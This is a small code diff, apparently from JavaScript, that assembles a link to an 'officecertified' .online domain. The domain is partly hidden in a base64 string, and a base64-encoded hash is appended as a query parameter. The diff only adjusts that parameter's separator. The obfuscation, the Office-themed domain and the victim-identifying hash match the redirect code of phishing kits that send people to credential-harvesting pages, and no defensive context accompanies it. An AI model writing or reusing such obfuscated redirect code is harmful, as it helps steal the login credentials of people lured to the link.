@@ -6,7 +6,7 @@
         const encdStr = 'Lm9ubGluZS8/a3J4aA==';
         const str = atob(encdStr);
         const encodedHash = btoa(hash); // Encode the hash using base64
-        const emma = '&qrc=' + encodedHash; // Use the encoded hash
+        const emma = '?&qrc=' + encodedHash; // Use the encoded hash
         const dr = 'https://officecertified';
         const ax = dr + str;
         var link = ax + emma;
